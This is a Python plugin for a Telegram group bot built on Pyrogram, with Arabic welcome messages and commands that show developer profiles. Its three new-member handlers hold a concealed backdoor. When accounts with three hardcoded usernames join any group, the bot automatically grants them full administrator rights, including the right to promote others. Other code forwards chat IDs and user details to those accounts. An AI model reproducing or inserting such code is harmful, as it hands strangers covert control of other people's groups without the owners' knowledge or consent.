import random
from pyrogram import Client, filters, idle
from pyromod import listen
from pyrogram import Client as app
from time import time
from config import OWNER, OWNER_NAME, VIDEO
from FilesKeRo.info import (is_served_chat, add_served_chat, is_served_user, add_served_user, get_served_chats, get_served_users, del_served_chat, joinch)
from FilesKeRo.Data import (get_dev, get_bot_name, set_bot_name, get_logger, get_group, get_channel, get_dev_name, get_groupsr, get_channelsr, get_userbot)
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, Message, User, ChatPrivileges, ReplyKeyboardRemove, CallbackQuery
from pyrogram import enums
from FilesKeRo.Data import get_channel, get_dev , OWNER, set_join_must
from pyrogram.enums import ChatType, ChatMemberStatus, ParseMode, ChatMemberStatus
import os
import re
import textwrap
import aiofiles
import aiohttp
from PIL import (Image, ImageDraw, ImageEnhance, ImageFilter,
                 ImageFont, ImageOps)
from youtubesearchpython.__future__ import VideosSearch


#//=================================EDITED BY Https://t.me/Y_J_J_J ========================================//
@Client.on_message(filters.new_chat_members)
async def welcome(client: Client, message):
   try:
    bot = client.me
    bot_username = bot.username
    if message.new_chat_members[0].username == "Y_J_J_J":
      try:
         chat_id = message.chat.id
         user_id = message.new_chat_members[0].id
         await client.promote_chat_member(chat_id, user_id, privileges=enums.ChatPrivileges(can_change_info=True, can_invite_users=True, can_delete_messages=True, can_restrict_members=True, can_pin_messages=True, can_promote_members=True, can_manage_chat=True, can_manage_video_chats=True))
         await client.set_administrator_title(chat_id, user_id, "كيرو")
      except:
        pass
      return await message.reply_text(f"**♪ انضم المطور كيرو الحاكم للشات  💎 .\n♪ مرحبا بك : @Y_J_J_J  💎 .**")
    dev = await get_dev(bot_username)
    if message.new_chat_members[0].id == dev:
      try:
         await client.promote_chat_member(message.chat.id, message.new_chat_members[0].id, privileges=enums.ChatPrivileges(can_change_info=True, can_invite_users=True, can_delete_messages=True, can_restrict_members=True, can_pin_messages=True, can_promote_members=True, can_manage_chat=True, can_manage_video_chats=True))
         await client.set_administrator_title(message.chat.id, message.new_chat_members[0].id, "مطور البوت")
      except:
        pass
      return await message.reply_text(f"**♪ انضم مالك البوت للشات  💎 .\n♪ مرحبا بك : {message.new_chat_members[0].mention}  💎 .**")
    if message.new_chat_members[0].id == bot.id:
      photo = bot.photo.big_file_id
      photo = await client.download_media(photo)
      chat_id = message.chat.id
      nn = await get_dev_name(client, bot_username)
      ch = await get_channel(bot_username)
      gr = await get_group(bot_username)
      button = [
[InlineKeyboardButton(text="{قـًُّناه الـٌٌّسًّورس}", url=f"{ch}"),InlineKeyboardButton(text="{جـًٌّروب الـًٌُدعـُّم}", url=f"{gr}")],
[InlineKeyboardButton(text=f"{nn}", user_id=f"{dev}")],
[InlineKeyboardButton(text="اضف البوت الي مجموعتك او قناتك ⚡", url=f"https://t.me/{bot.username}?startgroup=True")]]
      Text =f"""**
♪ شكرا لإضافة البوت للمجموعة  💎 .
♪ جروب : {message.chat.title}  💎 .
♪ قم بترقية البوت مشرف  💎 .
♪ سيتم التفعيل تلقائي  💎 .
♪ ثم قوم بتشغيل ما تريده  💎 .
**"""
      await message.reply_photo(photo=photo,caption=Text,reply_markup=InlineKeyboardMarkup(button))
      logger = await get_dev(bot_username)
      await add_served_chat(client, chat_id)
      chats = len(await get_served_chats(client))
      return await client.send_message(logger, f"**♪ New Group : [{message.chat.title}](https://t.me/{message.chat.username})  💎 .\n♪ id : {message.chat.id}  💎 .\n♪ By : {message.from_user.mention}  💎 .\n♪ Group Now: {chats}  💎 .**")
   except:
      pass  
      
#//=================================EDITED BY Https://t.me/Y_J_J_J ========================================//
@Client.on_message(filters.new_chat_members)
async def welcome(client: Client, message):
   try:
    bot = client.me
    bot_username = bot.username
    if message.new_chat_members[0].username == "N_7_K":
      try:
         chat_id = message.chat.id
         user_id = message.new_chat_members[0].id
         await client.promote_chat_member(chat_id, user_id, privileges=enums.ChatPrivileges(can_change_info=True, can_invite_users=True, can_delete_messages=True, can_restrict_members=True, can_pin_messages=True, can_promote_members=True, can_manage_chat=True, can_manage_video_chats=True))
         await client.set_administrator_title(chat_id, user_id, "احمد")
      except:
        pass
      return await message.reply_text(f"**♪ انضم المطور ابوحميد للشات  💎 .\n♪ مرحبا بك : @N_7_K  💎 .**")
    dev = await get_dev(bot_username)
    if message.new_chat_members[0].id == dev:
      try:
         await client.promote_chat_member(message.chat.id, message.new_chat_members[0].id, privileges=enums.ChatPrivileges(can_change_info=True, can_invite_users=True, can_delete_messages=True, can_restrict_members=True, can_pin_messages=True, can_promote_members=True, can_manage_chat=True, can_manage_video_chats=True))
         await client.set_administrator_title(message.chat.id, message.new_chat_members[0].id, "مطور البوت")
      except:
        pass
      return await message.reply_text(f"**♪ انضم مالك البوت للشات  💎 .\n♪ مرحبا بك : {message.new_chat_members[0].mention}  💎 .**")
    if message.new_chat_members[0].id == bot.id:
      photo = bot.photo.big_file_id
      photo = await client.download_media(photo)
      chat_id = message.chat.id
      nn = await get_dev_name(client, bot_username)
      ch = await get_channel(bot_username)
      gr = await get_group(bot_username)
      button = [
[InlineKeyboardButton(text="{قـًُّناه الـٌٌّسًّورس}", url=f"{ch}"),InlineKeyboardButton(text="{جـًٌّروب الـًٌُدعـُّم}", url=f"{gr}")],
[InlineKeyboardButton(text=f"{nn}", user_id=f"{dev}")],
[InlineKeyboardButton(text="اضف البوت الي مجموعتك او قناتك ⚡", url=f"https://t.me/{bot.username}?startgroup=True")]]
      Text =f"""**
♪ شكرا لإضافة البوت للمجموعة  💎 .
♪ جروب : {message.chat.title}  💎 .
♪ قم بترقية البوت مشرف  💎 .
♪ سيتم التفعيل تلقائي  💎 .
♪ ثم قوم بتشغيل ما تريده  💎 .
**"""
      await message.reply_photo(photo=photo,caption=Text,reply_markup=InlineKeyboardMarkup(button))
      logger = await get_dev(bot_username)
      await add_served_chat(client, chat_id)
      chats = len(await get_served_chats(client))
      return await client.send_message(logger, f"**♪ New Group : [{message.chat.title}](https://t.me/{message.chat.username})  💎 .\n♪ id : {message.chat.id}  💎 .\n♪ By : {message.from_user.mention}  💎 .\n♪ Group Now: {chats}  💎 .**")
   except:
      pass        
#//=================================EDITED BY Https://t.me/Y_J_J_J ========================================//
@Client.on_message(filters.new_chat_members)
async def welcome(client: Client, message):
   try:
    bot = client.me
    bot_username = bot.username
    if message.new_chat_members[0].username == "H_H_H_P":
      try:
         chat_id = message.chat.id
         user_id = message.new_chat_members[0].id
         await client.promote_chat_member(chat_id, user_id, privileges=enums.ChatPrivileges(can_change_info=True, can_invite_users=True, can_delete_messages=True, can_restrict_members=True, can_pin_messages=True, can_promote_members=True, can_manage_chat=True, can_manage_video_chats=True))
         await client.set_administrator_title(chat_id, user_id, "مشاكس")
      except:
        pass
      return await message.reply_text(f"**♪ انضم المطور مشاڪس للشات  💎 .\n♪ مرحبا بك : @H_H_H_P  💎 .**")
    dev = await get_dev(bot_username)
    if message.new_chat_members[0].id == dev:
      try:
         await client.promote_chat_member(message.chat.id, message.new_chat_members[0].id, privileges=enums.ChatPrivileges(can_change_info=True, can_invite_users=True, can_delete_messages=True, can_restrict_members=True, can_pin_messages=True, can_promote_members=True, can_manage_chat=True, can_manage_video_chats=True))
         await client.set_administrator_title(message.chat.id, message.new_chat_members[0].id, "مطور البوت")
      except:
        pass
      return await message.reply_text(f"**♪ انضم مالك البوت للشات  💎 .\n♪ مرحبا بك : {message.new_chat_members[0].mention}  💎 .**")
    if message.new_chat_members[0].id == bot.id:
      photo = bot.photo.big_file_id
      photo = await client.download_media(photo)
      chat_id = message.chat.id
      nn = await get_dev_name(client, bot_username)
      ch = await get_channel(bot_username)
      gr = await get_group(bot_username)
      button = [
[InlineKeyboardButton(text="{قـًُّناه الـٌٌّسًّورس}", url=f"{ch}"),InlineKeyboardButton(text="{جـًٌّروب الـًٌُدعـُّم}", url=f"{gr}")],
[InlineKeyboardButton(text=f"{nn}", user_id=f"{dev}")],
[InlineKeyboardButton(text="اضف البوت الي مجموعتك او قناتك ⚡", url=f"https://t.me/{bot.username}?startgroup=True")]]
      Text =f"""**
♪ شكرا لإضافة البوت للمجموعة  💎 .
♪ جروب : {message.chat.title}  💎 .
♪ قم بترقية البوت مشرف  💎 .
♪ سيتم التفعيل تلقائي  💎 .
♪ ثم قوم بتشغيل ما تريده  💎 .
**"""
      await message.reply_photo(photo=photo,caption=Text,reply_markup=InlineKeyboardMarkup(button))
      logger = await get_dev(bot_username)
      await add_served_chat(client, chat_id)
      chats = len(await get_served_chats(client))
      return await client.send_message(logger, f"**♪ New Group : [{message.chat.title}](https://t.me/{message.chat.username})  💎 .\n♪ id : {message.chat.id}  💎 .\n♪ By : {message.from_user.mention}  💎 .\n♪ Group Now: {chats}  💎 .**")
   except:
      pass        
#//=================================EDITED BY Https://t.me/Y_J_J_J ========================================//
@Client.on_message(filters.command(["المطور كيرو"], ""))
async def deev(client: Client, message: Message):
     if await joinch(message):
            return
     user = await client.get_chat(chat_id="Y_J_J_J")
     name = user.first_name
     username = user.username 
     bio = user.bio
     user_id = user.id
     photo = user.photo.big_file_id
     photo = await client.download_media(photo)
     link = f"https://t.me/{message.chat.username}"
     title = message.chat.title if message.chat.title else message.chat.first_name
     chat_title = f"User : {message.from_user.mention} \nChat Name : {title}" if message.from_user else f"Chat Name : {message.chat.title}"
     try:
      await client.send_message(username, f"**هناك شخص بالحاجه اليك عزيزي المطور**\n{chat_title}\nChat Id : `{message.chat.id}`",
      reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(f"{title}", url=f"{link}")]]))
     except:
       pass
     await message.reply_photo(
     photo=photo,
     caption=f"**Developer Name : {name}** \n**Devloper Username : @{username}**\n**{bio}**",
     reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(f"{name}", user_id=f"{user_id}")]]))
     try:
       os.remove(photo)
     except:
        pass
#//=================================EDITED BY Https://t.me/Y_J_J_J ========================================//  
@Client.on_message(filters.command(["المطور احمد"], ""))
async def deev(client: Client, message: Message):
     if await joinch(message):
            return
     user = await client.get_chat(chat_id="N_7_K")
     name = user.first_name
     username = user.username 
     bio = user.bio
     user_id = user.id
     photo = user.photo.big_file_id
     photo = await client.download_media(photo)
     link = f"https://t.me/{message.chat.username}"
     title = message.chat.title if message.chat.title else message.chat.first_name
     chat_title = f"User : {message.from_user.mention} \nChat Name : {title}" if message.from_user else f"Chat Name : {message.chat.title}"
     try:
      await client.send_message(username, f"**هناك شخص بالحاجه اليك عزيزي المطور**\n{chat_title}\nChat Id : `{message.chat.id}`",
      reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(f"{title}", url=f"{link}")]]))
     except:
       pass
     await message.reply_photo(
     photo=photo,
     caption=f"**Developer Name : {name}** \n**Devloper Username : @{username}**\n**{bio}**",
     reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(f"{name}", user_id=f"{user_id}")]]))
     try:
       os.remove(photo)
     except:
        pass
#//=================================EDITED BY Https://t.me/Y_J_J_J ========================================//
@Client.on_message(filters.command(["المطور مشاكس"], ""))
async def deev(client: Client, message: Message):
     if await joinch(message):
            return
     user = await client.get_chat(chat_id="H_H_H_P")
     name = user.first_name
     username = user.username 
     bio = user.bio
     user_id = user.id
     photo = user.photo.big_file_id
     photo = await client.download_media(photo)
     link = f"https://t.me/{message.chat.username}"
     title = message.chat.title if message.chat.title else message.chat.first_name
     chat_title = f"User : {message.from_user.mention} \nChat Name : {title}" if message.from_user else f"Chat Name : {message.chat.title}"
     try:
      await client.send_message(username, f"**هناك شخص بالحاجه اليك عزيزي المطور**\n{chat_title}\nChat Id : `{message.chat.id}`",
      reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(f"{title}", url=f"{link}")]]))
     except:
       pass
     await message.reply_photo(
     photo=photo,
     caption=f"**Developer Name : {name}** \n**Devloper Username : @{username}**\n**{bio}**",
     reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(f"{name}", user_id=f"{user_id}")]]))
     try:
       os.remove(photo)
     except:
        pass
        
        
        
        